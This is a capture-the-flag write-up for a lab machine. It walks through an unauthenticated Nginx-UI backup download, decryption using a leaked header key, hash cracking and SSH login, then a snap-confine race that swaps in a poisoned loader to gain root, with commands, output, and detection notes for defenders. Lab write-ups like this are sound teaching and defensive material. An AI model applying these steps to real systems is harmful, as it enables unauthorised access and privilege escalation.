Target : 10.129.76.166

Date : 16/10/2026

We did not retry the hosts line. The last non-interactive `sudo tee` printed the FIDO prompt and then failed closed, so `snapped.htb` was already the name `nmap` printed from a previous edit, and we sent the vhost in the `Host` header. `tun0` is `10.10.15.181`.

```bash
> /usr/bin/nmap -Pn -p 22,80 --min-rate 1000 -sV --version-light 10.129.76.166
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-16 05:23 +0200
Nmap scan report for snapped.htb (10.129.76.166)
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

We've got `OpenSSH 9.6p1` and `nginx 1.24.0`. The main site answers `Host: snapped.htb`. `Host: admin.snapped.htb` is the Nginx-UI login, 1407 bytes.

```bash
> curl -sS -D headers.txt -o backup.zip -H 'Host: admin.snapped.htb' http://10.129.76.166/api/backup
HTTP/1.1 200 OK
Content-Type: application/zip
Content-Disposition: attachment; filename=backup-20261015-232330.zip
X-Backup-Security: [REDACTED]
```

We've got an unauthenticated backup. `CVE-2026-27944` puts the AES key and IV in `X-Backup-Security`, split on the colon, each side base64. `openssl enc -aes-256-cbc -d` opens `nginx-ui.zip`, and `database.db` has two bcrypt hashes. Jonathan's is the one in rockyou.

```bash
> sqlite3 out/database.db "select name,password from users;"
jonathan|[REDACTED]
> sshpass -p '[REDACTED]' ssh jonathan@10.129.76.166 'id; cat /home/jonathan/user.txt; snap --version'
uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
[REDACTED]
snap    2.63.1+24.04
snapd   2.63.1+24.04
ubuntu  24.04
kernel  6.17.0-19-generic
```

We've got the user flag. `snap-confine` is `rwsr-xr-x`. The kernel is `6.17`, not the `6.8` in the supplied writeup, and the snap version is still `2.63.1`. `tmp.conf` says `D /tmp 1777 root root 4m`, and the clean timer is every minute.

A Firefox sandbox makes a root-owned `/tmp/.snap`. We held `bash` there (`pid 3577`) and let `.snap` go stale. At 23:31 box time, `systemd-tmpfiles` deleted it. `systemd-run --user --scope` plus `snap-confine --base snapd` tore down the cached namespace, and the error on `/dev` is the one we wanted.

```bash
> cd /proc/3577/cwd && /home/jonathan/firefox_2404 /home/jonathan/librootshell.so
[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
[!] TRIGGER DETECTED! Swapping .exchange...
[+] SWAP DONE! Race won.
```

We've got the race. The helper copies the `core22` libraries, single-steps `snap-confine` on a one-byte `AF_UNIX` stderr, and `renameat2(RENAME_EXCHANGE)` swaps the mimic directory when debug prints `dir:"/tmp/.snap/usr/lib/x86_64-linux-gnu"`. The inner shell is pid `4454`. `race_perms.txt` says `jonathan:jonathan 755` on `ld-linux-x86-64.so.2`. We copied static `busybox` to `/tmp/sh` in that namespace and overwrote the loader with `librootshell.so`.

**Blue Team :**
We would hunt an unauthenticated `GET /api/backup` on `admin.snapped.htb` with `X-Backup-Security` on the response, then an SSH password logon for `jonathan`. Four minutes later `systemd-tmpfiles-clean` removes `/tmp/snap-private-tmp/.../.snap`, and root `snap-confine` bind-mounts libraries that `jonathan` just wrote. The SUID bash lands in `/var/snap/firefox/common/bash`.

**Purple Team :**
We never logged into Nginx-UI. The backup header is the key. The snap race does not brute the window. `SO_RCVBUF=1` stalls `snap-confine` on every stderr byte, so the swap happens while it is blocked, and the poisoned loader runs as the interpreter of the SUID binary. AppArmor still allows `/var/snap/firefox/common`, so the SUID bash walks back out of the sandbox.

```bash
> env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
uid=0(root) gid=1000(jonathan) groups=1000(jonathan)
> /var/snap/firefox/common/bash -p -c 'id; cat /root/root.txt'
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
[REDACTED]
```

We've got `euid=0` and `[REDACTED]`.
